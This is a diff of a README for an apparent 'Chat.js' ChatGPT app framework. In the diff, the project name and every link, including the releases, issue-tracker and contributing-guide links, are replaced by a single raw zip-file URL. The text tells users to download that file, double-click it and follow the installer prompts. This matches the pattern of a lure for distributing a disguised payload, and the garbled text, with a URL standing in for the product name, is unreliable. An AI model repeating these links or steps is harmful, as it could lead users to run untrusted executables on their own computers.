@@ -1,22 +1,22 @@
-# 🌟 https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip - Create Smart Chat Applications Easily
+# 🌟 https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip - Create Smart Chat Applications Easily
 
-[![Download https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip](https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip)](https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip)
+[![Download https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip](https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip)](https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip)
 
 ## 📝 Description
 
-https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip is a framework designed to help you quickly create applications using ChatGPT. With this tool, you can build components and define schemas without the usual programming hassle. It's a perfect solution for anyone wanting to make smart chat applications.
+https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip is a framework designed to help you quickly create applications using ChatGPT. With this tool, you can build components and define schemas without the usual programming hassle. It's a perfect solution for anyone wanting to make smart chat applications.
 
 This project is built as an enhancement of OpenAI's Apps SDK Examples, making it easier for you to develop widgets and focus on creativity rather than technical complexities.
 
 ## 🚀 Getting Started
 
-Follow these steps to download and run https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip
+Follow these steps to download and run https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip
 
 ### Step 1: Visit the Releases Page
 
 Go to the releases page by clicking the link below:
 
-[Visit the https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip Releases Page](https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip)
+[Visit the https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip Releases Page](https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -30,13 +30,13 @@ Once you select a version, you will find the download link. Click the link to do
 
 After downloading, locate the file on your computer. Double-click the downloaded file to begin the installation process. Follow the on-screen instructions carefully. Accept the terms and complete any necessary steps to finish the installation.
 
-### Step 5: Open https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip
+### Step 5: Open https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip
 
-After installation, you can find https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip in your applications folder. Open it like any other application on your computer. You are now ready to start creating chat applications!
+After installation, you can find https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip in your applications folder. Open it like any other application on your computer. You are now ready to start creating chat applications!
 
 ## 🛠 Features
 
-https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip comes packed with helpful features:
+https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip comes packed with helpful features:
 
 - **User-friendly Interface**: Navigate effortlessly to create chat applications.
   
@@ -50,7 +50,7 @@ https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Cha
 
 ## 💻 System Requirements
 
-To run https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip smoothly, ensure your computer meets the following minimum requirements:
+To run https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip smoothly, ensure your computer meets the following minimum requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
   
@@ -62,20 +62,20 @@ To run https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelement
 
 ## 🔗 Download & Install
 
-To download https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip, visit our releases page:
+To download https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip, visit our releases page:
 
-[Download https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip](https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip)
+[Download https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip](https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip)
 
 Make sure to follow the installation steps outlined above to get started.
 
 ## 🤝 Community & Support
 
-If you encounter issues or have questions, please check our community guidelines for support. Feel free to report bugs or suggest features. Your feedback helps us improve https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip
+If you encounter issues or have questions, please check our community guidelines for support. Feel free to report bugs or suggest features. Your feedback helps us improve https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip
 
-- **GitHub Issues**: [Report an Issue](https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip)
+- **GitHub Issues**: [Report an Issue](https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip)
   
-- **Contributing Guide**: Interested in helping out? Check our [Contributing Guide](https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip).
+- **Contributing Guide**: Interested in helping out? Check our [Contributing Guide](https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip).
 
 ## ✨ Conclusion
 
-https://raw.githubusercontent.com/brightservice24/Chat.js/main/subelementary/Chat.js.zip empowers you to create chat applications without deep programming knowledge. With its user-friendly framework and features, you will find the process enjoyable and rewarding. Follow the steps to download and install, and join our community to make the most of this tool!
+https://raw.githubusercontent.com/brightservice24/Chat.js/main/src/components/solar-system/js-Chat-v3.7-alpha.5.zip empowers you to create chat applications without deep programming knowledge. With its user-friendly framework and features, you will find the process enjoyable and rewarding. Follow the steps to download and install, and join our community to make the most of this tool!
